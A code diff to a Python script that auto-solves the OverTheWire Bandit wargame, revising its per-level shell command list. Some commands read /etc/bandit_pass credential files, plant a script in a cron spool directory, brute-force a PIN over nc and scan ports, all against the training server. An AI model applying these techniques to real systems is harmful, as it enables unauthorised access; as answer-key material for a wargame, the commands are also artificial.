@@ -179,39 +179,39 @@ def create_temp_key(key_content):
 
 def get_commands():
     return [
-        'cat readme | grep -o "[a-zA-Z0-9]*" | tail -1',
-        'cat ./-',
-        'cat ./--spaces\\ in\\ this\\ filename--',
-        'cat inhere/...Hiding-From-You',
-        'cat inhere/-file07',
-        'find . -type f ! -executable -size 1033c -exec cat {} \\; | tr -d "[:space:]"',
-        'find / -group bandit6 -user bandit7 -size 33c -exec cat {} \\; 2>/dev/null',
-        'cat data.txt | grep "millionth" | sed "s/millionth[[:space:]]*//"',
-        'cat data.txt | sort | uniq -u',
-        'cat data.txt | grep -Eoa "=[=]+[A-Za-z0-9 ]+" | tail -1 | sed "s/\\=* //"',
-        'cat data.txt | grep -E "[A-Za-z0-9+]+" | base64 -d | sed "s/.* //g"',
-        'cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m" | sed "s/.* //g"',
-        'cat data.txt | xxd -r | gunzip -d | bzip2 -d | tar xzOf - | tar xOf - | bzip2 -d | tar xOf - | gunzip -d | sed "s/.* //g"',
-        'cat sshkey.private',
-        'cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed "/^[[:space:]]*$/d" | tail -1',
-        'cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed "/^[[:space:]]*$/d" | tail -1 | openssl s_client -connect localhost:30001 -ign_eof -quiet | sed "/^[[:space:]]*$/d" | tail -1',
-        '''nmap -T5 -p31000-32000 localhost | grep "/tcp" | cut -d"/" -f1 | xargs -I {} sh -c "cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed \\\"/^[[:space:]]*$/d\\\" | tail -1 | openssl s_client -connect localhost:30001 -ign_eof -quiet | sed \\\"/^[[:space:]]*$/d\\\" | tail -1 | timeout 2 openssl s_client -connect localhost:{} -ign_eof -quiet" | sed "1,/Correct/d"''',
-        'diff passwords.old passwords.new | tail -1 | cut -c3-',
-        'cat readme',
-        './bandit20-do cat /etc/bandit_pass/bandit20 | tee /tmp/bandit20_pass_sealldev',
-        '''PASS=$(cat /tmp/bandit20_pass_sealldev);mkfifo /tmp/pipe$$ && (echo "$PASS" > /tmp/pipe$$ &) && timeout 2 nc -lvnp 1337 < /tmp/pipe$$ 2>/dev/null & sleep 0.2 && ./suconnect 1337 > /dev/null 2>/dev/null && rm -f /tmp/pipe$$''',
-        'cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv',
-        'cat /tmp/8ca319486bfbbc3663ea0fbe81326349',
-        '''rm /tmp/bandit$$.sh 2>/dev/null; echo "#!/bin/bash" > /tmp/bandit$$.sh; echo "cat /etc/bandit_pass/bandit24 > /tmp/banditpass_$$" >> /tmp/bandit$$.sh; chmod +x /tmp/bandit$$.sh; cp /tmp/bandit$$.sh /var/spool/bandit24/foo/bandit$$.sh; counter=0; while [ ! -e "/tmp/banditpass_$$" ] && [ $counter -lt 600 ]; do sleep 0.1; counter=$((counter + 1)); done; if [ -e "/tmp/banditpass_$$" ]; then cat /tmp/banditpass_$$; else echo "TIMEOUT"; fi''',
-        '''PASS=$(cat /tmp/bandit24_pass_sealldev); for i in {0000..9999}; do echo "$PASS $i"; done | nc localhost 30002 >> /tmp/out$$; cat /tmp/out$$ | grep "user bandit25 is" | sed "s/.* //g" | uniq''',
-        'cat bandit26.sshkey',
-        'Custom Vim Script', # VIM
-        '''expect -c "spawn git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo /tmp/bandit27_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof" >/dev/null 2>&1 && cat /tmp/bandit27_repo/README | sed "s/.* //g" && rm -rf /tmp/bandit27_repo''',
-        '''expect -c "spawn git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo /tmp/bandit28_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit28_repo && git reset --hard 68314e012fbaa192abfc9b78ac369c82b75fab8f && cat README.md | grep password | sed 's/.* //g' && cd / && rm -rf /tmp/bandit28_repo\\"; expect eof" | tail -1''',
-        '''expect -c "spawn git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo /tmp/bandit29_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit29_repo && git switch dev && cat README.md | grep password | sed 's/.* //g' && cd / && rm -rf /tmp/bandit29_repo\\"; expect eof" | tail -1''',
-        '''expect -c "spawn git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo /tmp/bandit30_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit30_repo && git cat-file -p 84368f3a7ee06ac993ed579e34b8bd144afad351 && cd / && rm -rf /tmp/bandit30_repo\\"; expect eof" | tail -1''',
-        '''expect -c "spawn git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo /tmp/bandit31_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit31_repo && rm .gitignore && echo 'May I come in?' > key.txt && git add . && git commit -am 'key' && git push\\"; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd / && rm -rf /tmp/bandit31_repo\\"; expect eof" | grep 'remote: ' | sed "s/remote: //g" | sed '/.* .*/!d' | tail -1 | sed $'s,\\x1b\\\\[[0-9;]*[a-zA-Z],,g';''',
-        'Bash Jail Escape' #bash jail
+        'cat readme | grep "password" | sed "s/.* //"', # 0->1
+        'cat ./-', # 1->2
+        'cat ./--spaces\\ in\\ this\\ filename--', # 2->3
+        'cat inhere/...Hiding-From-You', # 3->4
+        'cat $(file inhere/* | grep ": ASCII" | sed "s/: .*//")', # 4->5
+        'find . -type f ! -executable -size 1033c -exec cat {} \\; | tr -d "[:space:]"', # 5->6
+        'find / -group bandit6 -user bandit7 -size 33c -exec cat {} \\; 2>/dev/null', # 6->7
+        'cat data.txt | grep "millionth" | sed "s/millionth[[:space:]]*//"', # 7->8
+        'cat data.txt | sort | uniq -u', # 8->9
+        'strings data.txt | grep "==" | tail -1 | sed "s/=* //"', # 9->10
+        'cat data.txt | base64 -d | sed "s/.* //"', # 10->11
+        'cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m" | sed "s/.* //g"', # 11->12
+        'cat data.txt | xxd -r | gunzip -d | bzip2 -d | tar xzOf - | tar xOf - | bzip2 -d | tar xOf - | gunzip -d | sed "s/.* //g"', # 12->13
+        'cat sshkey.private', # 13->14
+        'cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed "/^[[:space:]]*$/d" | tail -1', # 14->15
+        'cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed "/^[[:space:]]*$/d" | tail -1 | openssl s_client -connect localhost:30001 -ign_eof -quiet | sed "/^[[:space:]]*$/d" | tail -1', # 15->16
+        '''nmap -T5 -p31000-32000 localhost | grep "/tcp" | cut -d"/" -f1 | xargs -I {} sh -c "cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed \\\"/^[[:space:]]*$/d\\\" | tail -1 | openssl s_client -connect localhost:30001 -ign_eof -quiet | sed \\\"/^[[:space:]]*$/d\\\" | tail -1 | timeout 2 openssl s_client -connect localhost:{} -ign_eof -quiet" | sed "1,/Correct/d"''', # 16->17
+        'diff passwords.old passwords.new | tail -1 | cut -c3-', # 17->18
+        'cat readme', # 18->19
+        './bandit20-do cat /etc/bandit_pass/bandit20 | tee /tmp/bandit20_pass_sealldev', # 19->20
+        '''PASS=$(cat /tmp/bandit20_pass_sealldev);mkfifo /tmp/pipe$$ && (echo "$PASS" > /tmp/pipe$$ &) && timeout 2 nc -lvnp 1337 < /tmp/pipe$$ 2>/dev/null & sleep 0.2 && ./suconnect 1337 > /dev/null 2>/dev/null && rm -f /tmp/pipe$$''', # 20->21
+        'cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv', # 21->22
+        'cat /tmp/8ca319486bfbbc3663ea0fbe81326349', # 22->23
+        '''rm /tmp/bandit$$.sh 2>/dev/null; echo "#!/bin/bash" > /tmp/bandit$$.sh; echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass_sealldev" >> /tmp/bandit$$.sh; chmod +x /tmp/bandit$$.sh; cp /tmp/bandit$$.sh /var/spool/bandit24/foo/bandit$$.sh; counter=0; while [ ! -e "/tmp/bandit24_pass_sealldev" ] && [ $counter -lt 600 ]; do sleep 0.1; counter=$((counter + 1)); done; if [ -e "/tmp/bandit24_pass_sealldev" ]; then cat /tmp/bandit24_pass_sealldev; else echo "TIMEOUT"; fi''', # 23->24
+        '''PASS=$(cat /tmp/bandit24_pass_sealldev); for i in {0000..9999}; do echo "$PASS $i"; done | nc localhost 30002 >> /tmp/out$$; cat /tmp/out$$ | grep "user bandit25 is" | sed "s/.* //g" | uniq''', # 24->25
+        'cat bandit26.sshkey', # 25->26
+        'Custom Vim Script', # VIM 26->27
+        '''expect -c "spawn git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo /tmp/bandit27_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof" >/dev/null 2>&1 && cat /tmp/bandit27_repo/README | sed "s/.* //g" && rm -rf /tmp/bandit27_repo''', # 27->28
+        '''expect -c "spawn git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo /tmp/bandit28_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit28_repo && git reset --hard 68314e012fbaa192abfc9b78ac369c82b75fab8f && cat README.md | grep password | sed 's/.* //g' && cd / && rm -rf /tmp/bandit28_repo\\"; expect eof" | tail -1''', # 28->29
+        '''expect -c "spawn git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo /tmp/bandit29_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit29_repo && git switch dev && cat README.md | grep password | sed 's/.* //g' && cd / && rm -rf /tmp/bandit29_repo\\"; expect eof" | tail -1''', # 29->30
+        '''expect -c "spawn git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo /tmp/bandit30_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit30_repo && git cat-file -p 84368f3a7ee06ac993ed579e34b8bd144afad351 && cd / && rm -rf /tmp/bandit30_repo\\"; expect eof" | tail -1''', # 30->31
+        '''expect -c "spawn git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo /tmp/bandit31_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit31_repo && rm .gitignore && echo 'May I come in?' > key.txt && git add . && git commit -am 'key' && git push\\"; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd / && rm -rf /tmp/bandit31_repo\\"; expect eof" | grep 'remote: ' | sed "s/remote: //g" | sed '/.* .*/!d' | tail -1 | sed $'s,\\x1b\\\\[[0-9;]*[a-zA-Z],,g';''', # 31->32
+        'Bash Jail Escape' #bash jail 32->33
     ]
 
 def solve_level(level, password, key_path=None):
@@ -256,10 +256,7 @@ def solve_level(level, password, key_path=None):
                 result = run_command(client, commands[level], timeout=180)
             
             if result and result.strip():
-                if level == 0:
-                    print(f"    ★ Found {level} password: {result}\n")
-                else:
-                    print(f"    ★ Found {level}->{level+1} password: {result}\n")
+                print(f"    ★ Found {level}->{level+1} password: {result}\n")
                 
                 if level == 25:
                     print(f"    → SSH Key length: {len(result)} characters")
